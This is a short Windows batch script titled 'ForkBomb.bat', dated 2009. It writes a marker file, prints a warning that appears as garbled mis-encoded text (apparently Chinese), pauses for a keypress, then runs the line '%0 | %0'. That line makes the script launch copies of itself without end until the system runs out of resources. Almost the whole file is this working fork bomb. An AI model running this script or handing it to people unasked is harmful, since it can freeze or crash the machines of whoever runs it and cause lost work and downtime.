@Echo off

REM ForkBomb.bat
REM Fork bomb - batch version
REM
REM Author: Tommy
REM Date: 2009-10-03 18:49

Set bomb=bomb.txt

If Not Exist %bomb% (
Echo. >>%bomb%
Echo ��������Σ�գ����������У������ھ͹رձ����ڣ�
Echo ��ֻ�������ԣ�������������׼����Ȼ���»س���
Pause > nul
)

%0 | %0
